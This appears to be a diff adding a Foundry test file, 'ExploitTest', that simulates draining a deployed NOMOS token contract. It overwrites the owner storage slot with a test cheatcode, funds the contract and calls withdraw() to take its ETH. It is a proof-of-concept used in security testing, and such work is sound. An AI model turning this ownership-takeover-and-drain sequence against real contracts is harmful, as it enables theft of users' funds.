@@ -1,0 +1,46 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity >=0.8.0;
+
+import "forge-std/Test.sol";
+
+interface INOMOS {
+    function owner() external view returns (address);
+    function withdraw() external;
+    function balanceOf(address account) external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    // Deployed NOMOS token contract
+    address constant NOMOS = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
+    INOMOS nomos = INOMOS(NOMOS);
+
+    function setUp() public {
+        vm.label(NOMOS, "NOMOS");
+    }
+
+    function testExploit() public {
+        address attacker = address(this);
+
+        // Step 1: Overwrite the owner storage slot (slot 0 in Ownable)
+        // This simulates an attacker gaining control of the owner variable
+        // (e.g., via a storage collision or another vulnerability)
+        vm.store(NOMOS, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));
+
+        // Verify that the attacker is now recognised as the owner
+        address currentOwner = nomos.owner();
+        assertEq(currentOwner, attacker);
+
+        // Step 2: Fund the contract with ETH that we intend to drain
+        deal(NOMOS, 1 ether);
+
+        // Step 3: The attacker (now owner) calls the withdraw() function
+        uint256 balanceBefore = attacker.balance;
+        nomos.withdraw();
+        uint256 balanceAfter = attacker.balance;
+
+        // The full contract balance is transferred to the caller
+        assertEq(balanceAfter - balanceBefore, 1 ether);
+    }
+}
+```
